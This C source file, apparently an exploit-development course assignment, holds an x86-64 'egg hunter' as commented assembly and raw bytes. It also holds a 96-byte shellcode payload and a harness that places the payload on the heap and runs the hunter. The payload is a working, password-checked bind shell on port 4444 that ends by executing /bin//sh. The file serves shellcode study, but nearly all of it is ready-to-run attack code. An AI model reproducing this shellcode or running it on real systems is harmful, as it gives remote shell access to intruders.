#include<stdio.h>
#include<stdlib.h>
#include<string.h>

/*
;The MIT License (MIT)

;Copyright (c) 2017 Robert L. Taylor

;Permission is hereby granted, free of charge, to any person obtaining a 
;copy of this software and associated documentation files (the “Software”), 
;to deal in the Software without restriction, including without limitation 
;the rights to use, copy, modify, merge, publish, distribute, sublicense, 
;and/or sell copies of the Software, and to permit persons to whom the 
;Software is furnished to do so, subject to the following conditions:

;The above copyright notice and this permission notice shall be included 
;in all copies or substantial portions of the Software.

;The Software is provided “as is”, without warranty of any kind, express or
;implied, including but not limited to the warranties of merchantability, 
;fitness for a particular purpose and noninfringement. In no event shall the
;authors or copyright holders be liable for any claim, damages or other 
;liability, whether in an action of contract, tort or otherwise, arising 
;from, out of or in connection with the software or the use or other 
;dealings in the Software.
;
;For a detailed explanation of this shellcode see my blog post:
;http://a41l4.blogspot.ca/2017/02/assignment-3.html

global _start 

section .text

_start:
	xor edi,edi
	xor esi,esi	; F_OK = 0 for Access syscall
	push 4
	pop rbx		; number of bytes ahead to check
	xor edx,edx
	not edx
	shr edx, 20
nextpage:
	or rdi, rdx
	inc rdi		; RDI is now set to the first byte of a new page of memory
nextaddr:
	push rdi	; RDI needs to be used for scasd as well
	add rdi,rbx	; ensure that the ending byte for our scasd is readable
	push 21
	pop rax
	syscall
	cmp al, 0xf2	;Check for our SIGSEGV indicator
	pop rdi		; pop it back again or we will fill up the stack
	je nextpage
	mov eax, 0x31ff31ff ; Our Egg	
	scasd
	jnz nextaddr
	scasd		; we are assuming that if we found one egg, the next 4 bytes are okay to read
	jnz nextaddr	; probably found our EggHunter so jump back
	jmp rdi		; found our shellcode so execute it
*/

#define EGG "\xff\x31\xff\x31"

unsigned char EggHunter[] = \
"\x31\xff\x31\xf6\x6a\x04\x5b\x66\x81\xcf\xff\x0f\x48\xff\xc7\x57\x48"
"\x01\xdf\x6a\x15\x58\x0f\x05\x5f\x3c\xf2\x74\xea\xb8"
EGG
"\xaf\x75\xea\xaf\x75\xe7\xff\xe7";

unsigned char code[] = \
EGG
EGG
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x97\x52\x50\x66\xc7\x44\x24\x02\x11\x5c\x54\x5e\x50\xb0\x31\xb2\x10\x0f\x05\xb0\x32\x5e\x0f\x05\x54\x5e\x52\x54\x5a\xb0\x2b\x0f\x05\x92\x6a\x03\x58\x50\x0f\x05\x87\xd7\x5e\xb0\x21\xff\xce\x0f\x05\xe0\xf8\x5a\x54\x5e\x0f\x05\x5e\x81\xee\x31\x34\x33\x34\x75\xb3\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";

 /*
    EggHunter bytes = 42
    EggHunter nulls = 0
    Shellcode bytes = 96
    Shellcode nulls = 0
 */

int main()
{

 	printf("EggHunter Length:  %d\n", ((int)strlen(EggHunter)));
	printf("Shellcode Length:  %d\n", (int)strlen(code)-8);/* subtract the size of the EGGs */
	/* we are putting the shellcode on the heap for this example. */
	char *heap;
	heap=malloc(500);
	printf("Memory location of shellcode: %p\n", heap);
	memcpy(heap, code, sizeof(code));

 /*
    I decided to load up all the main registers to ensure that the shellcode
    still works no matter what state the registers are in.
 */
	__asm__ ("mov $0xffffffffffffffff, %rax\n"
		"push %rax\n"
		"pop %rbx\n"
		"push %rbx\n"
		"pop %rcx\n"
		"push %rcx\n"
		"pop %rdx\n"
		"push %rdx\n"
		"pop %rsi\n"
		"push %rsi\n"
		"pop %rdi\n"
		"call EggHunter\n"
		);

}
